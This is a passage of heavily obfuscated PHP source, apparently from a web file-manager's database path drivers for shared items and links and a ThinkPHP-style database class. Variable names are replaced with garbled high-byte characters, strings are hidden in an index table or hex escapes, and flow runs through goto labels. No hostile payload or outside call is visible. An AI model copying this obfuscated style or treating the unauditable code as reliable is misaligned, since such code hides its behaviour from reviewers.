$this->getPathOuter($–ŠºÒ¬); } public function mkdir($õç¢­ö, $û›³¶êÉ = REPEAT_SKIP) { $ï½Ö¿à­ =& $_SERVER[¯‘·½]; $ü¦ƒô£ = $this->parse($õç¢­ö); $õç¢­ö = $ü¦ƒô£[$ï½Ö¿à­[477]]; for ($ÇØ«úËé = 0; $ÇØ«úËé < count($ü¦ƒô£[$ï½Ö¿à­[1453]]); $ÇØ«úËé++) { $Ğí÷ß¸À = $ü¦ƒô£[$ï½Ö¿à­[1453]][$ÇØ«úËé]; $õç¢­ö = $this->model->mkdir($õç¢­ö, $Ğí÷ß¸À, $û›³¶êÉ); } return $this->getPathOuter($õç¢­ö); } public function copyFile($úà¡Û°¸, $ò»‚ãØí, $å‰ñşÔ© = REPEAT_REPLACE) { $×îÎŠÔ =& $_SERVER[¯‘·½]; $Â¢ãæ÷ò = $this->parse($ò»‚ãØí); $ó”Ï×Ü× = $this->model->copy($úà¡Û°¸, $Â¢ãæ÷ò[$×îÎŠÔ[477]], $å‰ñşÔ©, $Â¢ãæ÷ò[$×îÎŠÔ[87]]); return $ó”Ï×Ü× ? $this->getPathOuter($ó”Ï×Ü×) : !1; } public function moveFile($È¯çí¥, $ÜÄÍâà§, $§æªƒÍ÷ = REPEAT_REPLACE) { $´­ïıš‚ =& $_SERVER[¯‘·½]; $²ÇˆÙÊ = $this->parse($ÜÄÍâà§); $ÙÏÇ§° = $this->model->move($È¯çí¥, $²ÇˆÙÊ[$´­ïıš‚[477]], $§æªƒÍ÷, $²ÇˆÙÊ[$´­ïıš‚[87]]); return $ÙÏÇ§° ? $this->getPathOuter($ÙÏÇ§°) : !1; } public function copy($ï·ñğë˜, $Ã²‰¥, $„®”úŠ = REPEAT_REPLACE, $Ğé÷·Èç = false) { $°¼‡ùˆõ = $this->parse($Ã²‰¥); $àî‰‰ª¥ = $this->model->copy($ï·ñğë˜, $°¼‡ùˆõ[$_SERVER[¯‘·½][477]], $„®”úŠ, $Ğé÷·Èç); return $àî‰‰ª¥ ? $this->getPathOuter($àî‰‰ª¥) : !1; } public function moveSameAllow() { } public function move($óï£¯µÏ, $†¡ªÅ±ƒ, $ÂÛ¼©©ì = REPEAT_REPLACE, $—«¬¦æİ = false) { $¨¡¸µÑ = $this->parse($†¡ªÅ±ƒ); $Ì‰ìê¦ = $this->model->move($óï£¯µÏ, $¨¡¸µÑ[$_SERVER[¯‘·½][477]], $ÂÛ¼©©ì, $—«¬¦æİ); return $Ì‰ìê¦ ? $this->getPathOuter($Ì‰ìê¦) : !1; } public function remove($œ›Œ—ˆ†, $°Ú®çîì = true) { return $this->model->remove($œ›Œ—ˆ†, $°Ú®çîì); } public function rename($ªÕºù‹, $¯è¨úİ) { $®åø´õ = $this->model->rename($ªÕºù‹, $¯è¨úİ); return $®åø´õ ? $this->getPathOuter($ªÕºù‹) : $®åø´õ; } public function size($Ìş•ıá») { $ò¸ÊÂÊâ = $this->infoSimple($Ìş•ıá»); return $ò¸ÊÂÊâ ? $ò¸ÊÂÊâ[$_SERVER[¯‘·½][79]] : 0; } public function infoSimple($‚ÔÇåé™) { return $this->model->sourceInfo($‚ÔÇåé™); } public function info($úŒ»²½Ì) { return $this->infoParse($úŒ»²½Ì); } public function infoAuth($†Ãª¬Ş) { return $this->infoParse($†Ãª¬Ş, !1, !0); } public function infoWithChildren($Éåƒñß) { return $this->infoParse($Éåƒñß, !0); } protected function infoParse($Êáè£ò, $¤šŠ©› = false, $õâÄ®ı± = false) { if (!$¤šŠ©›) { return $this->model->pathInfo($Êáè£ò, $õâÄ®ı±); } return $this->model->pathInfoMore($Êáè£ò); } public function infoFullSimple($¢²ÙÛ¢‰) { $ÆšŞÚú¬ =& $_SERVER[¯‘·½]; $Ó™•¦šª = explode($ÆšŞÚú¬[8], $¢²ÙÛ¢‰); $”¬ü³î— = implode($ÆšŞÚú¬[8], array_splice($Ó™•¦šª, 1)); return $this->model->pathInfoByPath($Ó™•¦šª[0], $”¬ü³î—); } public function infoFull($Æ†Àô‘å) { $Ì¤ÖÔ“ = $this->infoFullSimple($Æ†Àô‘å); return is_array($Ì¤ÖÔ“) ? $this->model->pathInfo($Ì¤ÖÔ“[$_SERVER[¯‘·½][194]]) : !1; } public function hashSimple($±» ıÅ¸) { $äù¹­ÓŸ =& $_SERVER[¯‘·½]; $ó¼åÎ¨Î = $this->infoWithChildren($±» ıÅ¸); return $ó¼åÎ¨Î[$äù¹­ÓŸ[170]][$äù¹­ÓŸ[679]]; } public function hashMd5($¤±Ã€´ì) { $î‰åÁÅˆ =& $_SERVER[¯‘·½]; $ş‡¤ı„· = $this->infoWithChildren($¤±Ã€´ì); return $ş‡¤ı„·[$î‰åÁÅˆ[170]][$î‰åÁÅˆ[551]]; } public function exist($ËéüÌôƒ) { $Ü ‹àòš =& $_SERVER[¯‘·½]; $ıüÔô®· = $this->parse($ËéüÌôƒ); if (!$ıüÔô®·[$Ü ‹àòš[87]]) { return $this->isFile($ËéüÌôƒ) || $this->isFolder($ËéüÌôƒ); } $°š‚×· = array($Ü ‹àòš[479] => $ıüÔô®·[$Ü ‹àòš[477]], $Ü ‹àòš[32] => $ıüÔô®·[$Ü ‹àòš[87]]); $’Í¥ÎÈÆ = $this->model->where($°š‚×·)->find(); return $’Í¥ÎÈÆ ? !0 : !1; } public function isFile($çèÂ‹Æù) { $Îê˜Òƒ =& $_SERVER[¯‘·½]; $˜í¬®í = $this->infoSimple($çèÂ‹Æù); return $˜í¬®í && $˜í¬®í[$Îê˜Òƒ[487]] == $Îê˜Òƒ[231] ? !0 : !1; } public function isFolder($œÅ×íÀ) { $×–ØÁèÅ =& $_SERVER[¯‘·½]; $ˆÀ±“Å = $this->infoSimple($œÅ×íÀ); return $ˆÀ±“Å && $ˆÀ±“Å[$×–ØÁèÅ[487]] == $×–ØÁèÅ[91] ? !0 : !1; } public function listPath($¥ÅÀ˜í‰, $˜¼¡¼ = false) { $»Ìê¾í¸ =& $_SERVER[¯‘·½]; if ($¥ÅÀ˜í‰ == $»Ìê¾í¸[12]) { return !1; } $èƒÓÊÜ¹ = array($»Ìê¾í¸[479] => $¥ÅÀ˜í‰); if ($˜¼¡¼) { return $this->model->listSource($èƒÓÊÜ¹, -1); } return $this->model->listSource($èƒÓÊÜ¹); } public function has($‚ëÒˆ°, $¢ŞÏ÷… = false, $Ş€…©è¼ = null) { $—ñŒş¼ =& $_SERVER[¯‘·½]; $É»ïó« = $this->infoWithChildren($‚ëÒˆ°); if ($¢ŞÏ÷…) { return array($—ñŒş¼[243] => $É»ïó«[$—ñŒş¼[243]], $—ñŒş¼[242] => $É»ïó«[$—ñŒş¼[242]]); } return $Ş€…©è¼ ? $É»ïó«[$—ñŒş¼[243]] : $É»ïó«[$—ñŒş¼[242]]; } public function listAll($ñ˜ŒéóÙ) { $¢ÀÙı£ = IO::info($this->pathParse[$_SERVER[¯‘·½][87]]); if (!$¢ÀÙı£) { return array(); } return $this->model->listAll($ñ˜ŒéóÙ); } public function getContent($èĞôäô¸) { return $this->model->getContent($èĞôäô¸); } public function setContent($«ºÜÔ„½, $’Ê—´šÕ = '') { return $this->model->setContent($«ºÜÔ„½, $’Ê—´šÕ); } public function fileSubstr($ôù»Ó²ï, $»®ªÎ‘–, $»£°°×) { return $this->model->fileSubstr($ôù»Ó²ï, $»®ªÎ‘–, $»£°°×); } public function download($È¢¡ù, $å¦àºÊ = '') { $š‚çĞ®ã = get_path_father($å¦àºÊ); $¡–ÚÁå = get_path_this($å¦àºÊ); $şËà = $this->model->fileInfoGet($È¢¡ù); $äßÖ£òÒ = IO::copy($şËà[$_SERVER[¯‘·½][87]], $š‚çĞ®ã, !1, $¡–ÚÁå); return $äßÖ£òÒ; } public function setModifyTime($¥“Ğ¦‘Š, $ÊÓ“ˆÄ³ = '') { $¹ñ‡öØ” =& $_SERVER[¯‘·½]; if (!$¥“Ğ¦‘Š) { return; } $this->model->where(array($¹ñ‡öØ”[493] => $¥“Ğ¦‘Š))->save(array($¹ñ‡öØ”[88] => $ÊÓ“ˆÄ³)); } public function upload($Ãğ ×ëÏ, $¤¥£øÂ¦, $ÂíÂÓ’ = false, $òø¢‡àå = REPEAT_REPLACE) { $”å“¥ğ¬ =& $_SERVER[¯‘·½]; $ğµ‡¾Š = $this->parse($Ãğ ×ëÏ); $ò“²™°¢ = $this->model->addFile($ğµ‡¾Š[$”å“¥ğ¬[477]], $¤¥£øÂ¦, $ğµ‡¾Š[$”å“¥ğ¬[87]], $ÂíÂÓ’, $òø¢‡àå); return $this->getPathOuter($ò“²™°¢); } public function uploadFileByID($Â°‚íÏŠ, $Ğ³İµ„Ï, $Šƒ¥ò€) { $ŒÜ»Ÿú =& $_SERVER[¯‘·½]; $£Ò– Â = $this->parse($Â°‚íÏŠ); $±‚ö÷¤Ñ = $this->model->addFileByFileID($£Ò– Â[$ŒÜ»Ÿú[477]], $Ğ³İµ„Ï, $£Ò– Â[$ŒÜ»Ÿú[87]], $Šƒ¥ò€); return $this->getPathOuter($±‚ö÷¤Ñ); } public function addFileByRemote($Œ÷ÜÎò, $³Ú´ØÇâ, $±À˜¬¤¢ = array(), $Œ–Û”ªğ = '', $Ñ‹½¸å) { $–‰ç¼»™ =& $_SERVER[¯‘·½]; $ÁäÙµÆÌ = $this->parse($Œ÷ÜÎò); $Œ–Û”ªğ = empty($Œ–Û”ªğ) ? $ÁäÙµÆÌ[$–‰ç¼»™[87]] : $Œ–Û”ªğ; $ƒŠ·ÁâÍ = $this->model->addFileByRemote($ÁäÙµÆÌ[$–‰ç¼»™[477]], $³Ú´ØÇâ, $Œ–Û”ªğ, $±À˜¬¤¢, $Ñ‹½¸å); return $this->getPathOuter($ƒŠ·ÁâÍ); } public function uploadLink($½š ËƒŸ, $ğ¬Åû®Ó = 0) { $íşœ—Ÿ =& $_SERVER[¯‘·½]; $—Êœ§ˆ“ = $this->parse($½š ËƒŸ); $èúÈ…’˜ = _get($GLOBALS[$íşœ—Ÿ[7]], $íşœ—Ÿ[1454]); $í¯àò—û = _get($GLOBALS[$íşœ—Ÿ[7]], $íşœ—Ÿ[1455]); $¦–ò–•„ = KodIO::ioFileDriverGet($íşœ—Ÿ[485] . $—Êœ§ˆ“[$íşœ—Ÿ[477]] . $íşœ—Ÿ[404]); $‘£§œ» = Model($íşœ—Ÿ[681])->createFileName($—Êœ§ˆ“[$íşœ—Ÿ[87]], $¦–ò–•„, $èúÈ…’˜, $í¯àò—û); return IO::uploadLink($‘£§œ», $ğ¬Åû®Ó); } public function fileNameAuto($ş¢­¬à÷, $Æˆ‡ƒÙã, $±×‹†õû = REPEAT_REPLACE, $ÔûÀ‡øı = false) { return $this->model->fileNameAuto($ş¢­¬à÷, $Æˆ‡ƒÙã, $±×‹†õû, $ÔûÀ‡øı); } public function fileNameExist($ÕáØ²Ì, $°İ„Ã“Ú) { return $this->model->fileNameExist($ÕáØ²Ì, $°İ„Ã“Ú); } protected function _fileOut($¡ü§à™, $–ÏÅ¿“õ = false, $«Á÷Šì = false, $É·ÌæÜš = '', $œ•ÌŸĞ = false) { $³üö¹òü =& $_SERVER[¯‘·½]; $•¼«Ã°Ù = $this->model->sourceInfo($¡ü§à™); if ($•¼«Ã°Ù[$³üö¹òü[487]] == $³üö¹òü[91]) { header($³üö¹òü[1456]); die; } $„æŠ¶¥Ø = $this->model->fileInfoGet($¡ü§à™); $É·ÌæÜš = $„æŠ¶¥Ø[$³üö¹òü[551]] ? $„æŠ¶¥Ø[$³üö¹òü[551]] : $É·ÌæÜš; $„õáİŞµ = isset($GLOBALS[$³üö¹òü[183]]) && is_array($GLOBALS[$³üö¹òü[183]]) ? $GLOBALS[$³üö¹òü[183]][$³üö¹òü[32]] : $•¼«Ã°Ù[$³üö¹òü[32]]; if ($œ•ÌŸĞ) { return IO::fileOutServer($„æŠ¶¥Ø[$³üö¹òü[87]], $–ÏÅ¿“õ, $„õáİŞµ, $É·ÌæÜš); } IO::fileOut($„æŠ¶¥Ø[$³üö¹òü[87]], $–ÏÅ¿“õ, $„õáİŞµ, $É·ÌæÜš); } public function fileOut($½Í«Ëº, $íÓå = false, $èÊ½êÒ« = false, $±×ÔÄáÀ = '') { $this->_fileOut($½Í«Ëº, $íÓå, $èÊ½êÒ«, $±×ÔÄáÀ); } public function fileOutServer($¸è¾×Âõ, $ë„€Öïœ = false, $‰ºùñ¾¼ = false, $Šë˜•® = '') { $this->_fileOut($¸è¾×Âõ, $ë„€Öïœ, $‰ºùñ¾¼, $Šë˜•®, !0); } protected function _fileOutImage($éÏöÛƒ§, $áˆßõß  = 250) { $Û¦úà·Ğ =& $_SERVER[¯‘·½]; $’“ÒÏ…ş = $this->model->pathInfo($éÏöÛƒ§); if ($’“ÒÏ…ş[$Û¦úà·Ğ[487]] == $Û¦úà·Ğ[91]) { show_json($Û¦úà·Ğ[1457] . $éÏöÛƒ§, !1); } $¦å›‚º¦ = $this->model->fileInfoGet($éÏöÛƒ§); $’“ÒÏ…ş[$Û¦úà·Ğ[184]] = $¦å›‚º¦[$Û¦úà·Ğ[87]]; $GLOBALS[$Û¦úà·Ğ[183]] = $’“ÒÏ…ş; IO::fileOutImage($¦å›‚º¦[$Û¦úà·Ğ[87]], $áˆßõß ); } public function fileOutImage($—÷ŠÜ—õ, $÷­ó®¼ = 250) { $this->_fileOutImage($—÷ŠÜ—õ, $÷­ó®¼); } public function fileOutImageServer($ˆâÀÛç¤, $’ÁñÚ»  = 250) { $this->_fileOutImage($ˆâÀÛç¤, $’ÁñÚ» ); } public function link($úàŞç“í, $øıªßë = '') { $û³‡´–Â = $this->model->fileInfoGet($úàŞç“í); return IO::link($û³‡´–Â[$_SERVER[¯‘·½][87]], $øıªßë); } protected function parse($»‡üÛö“) { $öçÂÂô =& $_SERVER[¯‘·½]; if (strstr($»‡üÛö“, $öçÂÂô[8]) === !1) { return array($öçÂÂô[495] => intval($»‡üÛö“), $öçÂÂô[87] => $öçÂÂô[12], $öçÂÂô[1453] => array()); } $µ³§­Ñ = explode($öçÂÂô[8], trim($»‡üÛö“, $öçÂÂô[8])); if (count($µ³§­Ñ) < 2) { show_tips(clear_html($»‡üÛö“) . $öçÂÂô[1458]); } return array($öçÂÂô[495] => intval($µ³§­Ñ[0]), $öçÂÂô[87] => $µ³§­Ñ[1], $öçÂÂô[1453] => array_slice($µ³§­Ñ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($˜² …’“) { $this->pathParse = $˜² …’“; $this->model = Model($_SERVER[¯‘·½][1452]); } public function getPathOuter($Ûà¬„²) { $†ï«İ­Ô =& $_SERVER[¯‘·½]; if (!$Ûà¬„²) { return $Ûà¬„²; } $¦¿ºŒ€¤ = $this->parse($Ûà¬„²); return trim(KodIO::makeShare($this->pathParse[$†ï«İ­Ô[477]], $¦¿ºŒ€¤[$†ï«İ­Ô[477]]), $†ï«İ­Ô[8]); } protected function infoParse($Ê’š¡Ö·, $š™ÙÓ²ë = false, $îÈ³€°Š = false) { $öğº» =& $_SERVER[¯‘·½]; $Êöıß¦â = $this->pathParse[$öğº»[477]]; $éÎ™‡„ö = trim($this->pathParse[$öğº»[1273]], $öğº»[8]); return Action($öğº»[1459])->sharePathInfo($Êöıß¦â, $éÎ™‡„ö, $š™ÙÓ²ë); } public function infoFull($ŠüÎÏï) { $ÀÔìœ¢Ÿ =& $_SERVER[¯‘·½]; $ÔòÂèÆé = explode($ÀÔìœ¢Ÿ[8], trim($ŠüÎÏï, $ÀÔìœ¢Ÿ[8])); if (count($ÔòÂèÆé) > 1) { $ĞÍ®œ¨ú = implode($ÀÔìœ¢Ÿ[8], array_splice($ÔòÂèÆé, 1)); $ïµ ”Ó‡ = $this->model->pathInfoByPath($ÔòÂèÆé[0], $ĞÍ®œ¨ú); if (!$ïµ ”Ó‡) { return !1; } $this->pathParse[$ÀÔìœ¢Ÿ[1273]] = $ïµ ”Ó‡[$ÀÔìœ¢Ÿ[194]]; } return $this->infoParse($ŠüÎÏï); } public function listAll($™‹Å„·§) { $‡Ğ®©ÕÜ =& $_SERVER[¯‘·½]; $—ƒÊ§…â = IO::info($this->pathParse[$‡Ğ®©ÕÜ[87]]); if (!$—ƒÊ§…â) { return array(); } $ŒØÉ§ ­ = $this->model->listAll($™‹Å„·§); $ÄŞ¶²‚± = Model($‡Ğ®©ÕÜ[671])->getInfo($—ƒÊ§…â[$‡Ğ®©ÕÜ[672]]); foreach ($ŒØÉ§ ­ as &$¡İ¹‚å) { check_abort(); $¡İ¹‚å[$‡Ğ®©ÕÜ[90]] = Action($‡Ğ®©ÕÜ[1459])->_shareItemeParse($¡İ¹‚å[$‡Ğ®©ÕÜ[90]], $ÄŞ¶²‚±); } unset($¡İ¹‚å); return $ŒØÉ§ ­; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($‰îĞñè‹) { $this->pathParse = $‰îĞñè‹; $this->model = Model($_SERVER[¯‘·½][1452]); } protected function infoParse($íéÏËÌ³, $ÖÕ¡÷¶ñ = false, $æıøãùÕ = false) { $É×©ôÀ‹ =& $_SERVER[¯‘·½]; return Action($É×©ôÀ‹[1280])->sharePathInfo($this->pathParse[$É×©ôÀ‹[87]], !0, $ÖÕ¡÷¶ñ); } public function listPath($¤®Ë«‹­, $›ÃŸü÷‡ = false) { $ªùí€¸é =& $_SERVER[¯‘·½]; $±óÃ±Á = parent::listPath($¤®Ë«‹­, $›ÃŸü÷‡); if (!$±óÃ±Á) { return $±óÃ±Á; } if (is_array($±óÃ±Á[$ªùí€¸é[1460]])) { $±óÃ±Á[$ªùí€¸é[1460]] = Action($ªùí€¸é[1280])->shareItemInfo($±óÃ±Á[$ªùí€¸é[1460]]); } foreach ($±óÃ±Á as $¨Å³Ã«Ô => $‚ãïÖ‰ı) { if (!in_array($¨Å³Ã«Ô, array($ªùí€¸é[86], $ªùí€¸é[85]))) { continue; } foreach ($‚ãïÖ‰ı as $â‘Úàˆ¾ => $¬°‰³œÔ) { $±óÃ±Á[$¨Å³Ã«Ô][$â‘Úàˆ¾] = Action($ªùí€¸é[1280])->shareItemInfo($¬°‰³œÔ); } } return $±óÃ±Á; } public function listAll($²„‘Çµ) { $Ş­º‚¼ß =& $_SERVER[¯‘·½]; $…ŞÃÒ»Ù = IO::info($this->pathParse[$Ş­º‚¼ß[87]]); if (!$…ŞÃÒ»Ù) { return array(); } $›õõ—¿Ó = $this->model->listAll($²„‘Çµ); foreach ($›õõ—¿Ó as &$œ×«Ø‡¶) { $œ×«Ø‡¶[$Ş­º‚¼ß[90]] = Action($Ş­º‚¼ß[1280])->shareItemInfo($œ×«Ø‡¶[$Ş­º‚¼ß[90]]); } unset($œ×«Ø‡¶); return $›õõ—¿Ó; } } goto AÌµ¥âéÅƒ; D„‘íÙ”°†: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\x71" => "\x3c\x3e", "\147\x74" => "\x3e", "\x65\x67\164" => "\76\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\x3c\75", "\x6e\x6f\x74\154\151\153\x65" => "\116\x4f\124\40\x4c\x49\x4b\105", "\x6c\x69\153\x65" => "\114\111\x4b\105", "\x69\156" => "\x49\x4e", "\x6e\x6f\x74\151\x6e" => "\116\x4f\124\x20\x49\116", "\x6e\157\164\40\151\x6e" => "\116\117\124\40\111\x4e", "\x62\145\164\x77\x65\x65\x6e" => "\102\x45\124\127\105\105\116", "\x6e\157\164\x62\x65\164\x77\145\x65\x6e" => "\x4e\x4f\124\x20\x42\105\124\127\x45\105\x4e", "\156\157\x74\x20\x62\145\x74\x77\145\x65\156" => "\x4e\117\x54\40\x42\105\124\127\x45\x45\x4e"); protected $selectSql = "\x53\105\114\105\103\x54\x25\104\x49\x53\124\111\x4e\x43\124\x25\40\x25\106\x49\105\114\104\x25\40\x46\122\x4f\x4d\40\x25\124\x41\102\114\105\45\45\x4a\117\x49\x4e\45\45\x57\x48\105\122\105\x25\45\x47\x52\117\125\x50\x25\45\x48\101\x56\111\x4e\x47\45\45\x4f\x52\104\x45\x52\x25\45\114\111\x4d\111\124\x25\x20\45\125\x4e\111\117\x4e\x25\45\103\x4f\x4d\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ØŸ£‡Ô = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¯‘·½][1056], $ØŸ£‡Ô); } public function factory($Úößˆù = '') { $‘¯ôËÖ¢ =& $_SERVER[¯‘·½]; $Úößˆù = $this->parseConfig($Úößˆù); if (empty($Úößˆù[$‘¯ôËÖ¢[1057]])) { think_exception(think_lang($‘¯ôËÖ¢[1058])); } $this->dbType = ucwords(strtolower($Úößˆù[$‘¯ôËÖ¢[1057]])); $¸¼û…±Ö = $‘¯ôËÖ¢[1059] . $this->dbType; if (class_exists($¸¼û…±Ö)) { $Áã´Ã â = new $¸¼û…±Ö($Úößˆù); if ($‘¯ôËÖ¢[1060] != strtolower($Úößˆù[$‘¯ôËÖ¢[1057]])) { $Áã´Ã â->dbType = strtoupper($this->dbType); } else { $Áã´Ã â->dbType = $this->_getDsnType($Úößˆù[$‘¯ôËÖ¢[1012]]); } } else { think_exception(think_lang($‘¯ôËÖ¢[1061]) . $‘¯ôËÖ¢[1062] . $¸¼û…±Ö); } return $Áã´Ã â; } public function __call($Â¢ƒş‡, $«‰ÙñÌ”) { if (method_exists($this, $Â¢ƒş‡)) { return call_user_func_array(array($this, $Â¢ƒş‡), $«‰ÙñÌ”); } } protected function _getDsnType($½ø¶‰ª) { $ãşºü¯ó = explode($_SERVER[¯‘·½][4], $½ø¶‰ª); $£Ò²Ó«Ğ = strtoupper(trim($ãşºü¯ó[0])); return $£Ò²Ó«Ğ; } private function parseConfig($Ñ„ÜÒ´ = '') { $òïŞÜò­ =& $_SERVER[¯‘·½]; if (!empty($Ñ„ÜÒ´) && is_string($Ñ„ÜÒ´)) { $Ñ„ÜÒ´ = $this->parseDSN($Ñ„ÜÒ´); } elseif (is_array($Ñ„ÜÒ´)) { $Ñ„ÜÒ´ = array_change_key_case($Ñ„ÜÒ´); $Ñ„ÜÒ´ = array($òïŞÜò­[1057] => $Ñ„ÜÒ´[$òïŞÜò­[1063]], $òïŞÜò­[984] => $Ñ„ÜÒ´[$òïŞÜò­[1064]], $òïŞÜò­[985] => $Ñ„ÜÒ´[$òïŞÜò­[1065]], $òïŞÜò­[982] => $Ñ„ÜÒ´[$òïŞÜò­[1066]], $òïŞÜò­[983] => $Ñ„ÜÒ´[$òïŞÜò­[1067]], $òïŞÜò­[21] => $Ñ„ÜÒ´[$òïŞÜò­[1068]], $òïŞÜò­[1012] => $Ñ„ÜÒ´[$òïŞÜò­[1069]], $òïŞÜò­[17] => isset($Ñ„ÜÒ´[$òïŞÜò­[1070]]) ? $Ñ„ÜÒ´[$òïŞÜò­[1070]] : array()); } elseif (empty($Ñ„ÜÒ´)) { if (think_config($òïŞÜò­[1071]) && $òïŞÜò­[1060] != strtolower(think_config($òïŞÜò­[1072]))) { $Ñ„ÜÒ´ = $this->parseDSN(think_config($òïŞÜò­[1071])); } else { $Ñ„ÜÒ´ = array($òïŞÜò­[1057] => think_config($òïŞÜò­[1072]), $òïŞÜò­[984] => think_config($òïŞÜò­[1073]), $òïŞÜò­[985] => think_config($òïŞÜò­[1074]), $òïŞÜò­[982] => think_config($òïŞÜò­[1075]), $òïŞÜò­[983] => think_config($òïŞÜò­[1076]), $òïŞÜò­[21] => think_config($òïŞÜò­[326]), $òïŞÜò­[1012] => think_config($òïŞÜò­[1071]), $òïŞÜò­[17] => think_config($òïŞÜò­[1077])); } } return $Ñ„ÜÒ´; } protected function initConnect($¹¹öî´… = true) { if (1 == think_config($_SERVER[¯‘·½][22])) { $this->_linkID = $this->multiConnect($¹¹öî´…); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $±–²†Øç => $ŞŸ«¹Š) { $this->_linkID = $ŞŸ«¹Š; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‡…İÔÁ = false) { $â­ñÙ™º =& $_SERVER[¯‘·½]; static $—ä•´Ûı = array(); static $ĞêãšşÎ = -1; if (empty($—ä•´Ûı)) { foreach ($this->config as $ÚÔöÒÔ => $ã˜ã–•) { $—ä•´Ûı[$ÚÔöÒÔ] = explode($â­ñÙ™º[50], $ã˜ã–•); } } if (think_config($â­ñÙ™º[1078])) { if ($‡…İÔÁ || think_config($â­ñÙ™º[473]) === !0) { $ú‘×¤¶‰ = floor(mt_rand(0, think_config($â­ñÙ™º[1079]) - 1)); $ĞêãšşÎ = $ú‘×¤¶‰; } else { if (is_numeric(think_config($â­ñÙ™º[1080]))) { $ú‘×¤¶‰ = think_config($â­ñÙ™º[1080]); } else { $ú‘×¤¶‰ = floor(mt_rand(think_config($â­ñÙ™º[1079]), count($—ä•´Ûı[$â­ñÙ™º[982]]) - 1)); } } } else { $ú‘×¤¶‰ = floor(mt_rand(0, count($—ä•´Ûı[$â­ñÙ™º[982]]) - 1)); $ĞêãšşÎ = $ú‘×¤¶‰; } $ú‘×¤¶‰ = $ĞêãšşÎ !== -1 ? $ĞêãšşÎ : $ú‘×¤¶‰; $÷¤¢ÚÖƒ = array($â­ñÙ™º[984] => isset($—ä•´Ûı[$â­ñÙ™º[984]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[984]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[984]][0], $â­ñÙ™º[985] => isset($—ä•´Ûı[$â­ñÙ™º[985]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[985]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[985]][0], $â­ñÙ™º[982] => isset($—ä•´Ûı[$â­ñÙ™º[982]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[982]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[982]][0], $â­ñÙ™º[983] => isset($—ä•´Ûı[$â­ñÙ™º[983]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[983]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[983]][0], $â­ñÙ™º[21] => isset($—ä•´Ûı[$â­ñÙ™º[21]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[21]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[21]][0], $â­ñÙ™º[1012] => isset($—ä•´Ûı[$â­ñÙ™º[1012]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[1012]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[1012]][0], $â­ñÙ™º[17] => isset($—ä•´Ûı[$â­ñÙ™º[17]][$ú‘×¤¶‰]) ? $—ä•´Ûı[$â­ñÙ™º[17]][$ú‘×¤¶‰] : $—ä•´Ûı[$â­ñÙ™º[17]][0]); return $this->connect($÷¤¢ÚÖƒ, $ú‘×¤¶‰); } public function parseDSN($ıŞ‹éƒÏ) { $ê˜Ê‡óâ =& $_SERVER[¯‘·½]; if (empty($ıŞ‹éƒÏ)) { return !1; } $ª¦û°ø™ = parse_url($ıŞ‹éƒÏ); if ($ª¦û°ø™[$ê˜Ê‡óâ[208]]) { $ÀÙÌ½ü  = array($ê˜Ê‡óâ[1057] => $ª¦û°ø™[$ê˜Ê‡óâ[208]], $ê˜Ê‡óâ[984] => isset($ª¦û°ø™[$ê˜Ê‡óâ[669]]) ? $ª¦û°ø™[$ê˜Ê‡óâ[669]] : $ê˜Ê‡óâ[12], $ê˜Ê‡óâ[985] => isset($ª¦û°ø™[$ê˜Ê‡óâ[1081]]) ? $ª¦û°ø™[$ê˜Ê‡óâ[1081]] : $ê˜Ê‡óâ[12], $ê˜Ê‡óâ[982] => isset($ª¦û°ø™[$ê˜Ê‡óâ[209]]) ? $ª¦û°ø™[$ê˜Ê‡óâ[209]] : $ê˜Ê‡óâ[12], $ê˜Ê‡óâ[983] => isset($ª¦û°ø™[$ê˜Ê‡óâ[210]]) ? $ª¦û°ø™[$ê˜Ê‡óâ[210]] : $ê˜Ê‡óâ[12], $ê˜Ê‡óâ[21] => isset($ª¦û°ø™[$ê˜Ê‡óâ[87]]) ? substr($ª¦û°ø™[$ê˜Ê‡óâ[87]], 1) : $ê˜Ê‡óâ[12]); } else { preg_match($ê˜Ê‡óâ[1082], trim($ıŞ‹éƒÏ), $–×ü¡¾Ö); $ÀÙÌ½ü  = array($ê˜Ê‡óâ[1057] => $–×ü¡¾Ö[1], $ê˜Ê‡óâ[984] => $–×ü¡¾Ö[2], $ê˜Ê‡óâ[985] => $–×ü¡¾Ö[3], $ê˜Ê‡óâ[982] => $–×ü¡¾Ö[4], $ê˜Ê‡óâ[983] => $–×ü¡¾Ö[5], $ê˜Ê‡óâ[21] => $–×ü¡¾Ö[6]); } $ÀÙÌ½ü [$ê˜Ê‡óâ[1012]] = $ê˜Ê‡óâ[12]; return $ÀÙÌ½ü ; } protected function debug() { $å±Şã—¯ =& $_SERVER[¯‘·½]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $å±Şã—¯[1083]; if (think_config($å±Şã—¯[1084])) { 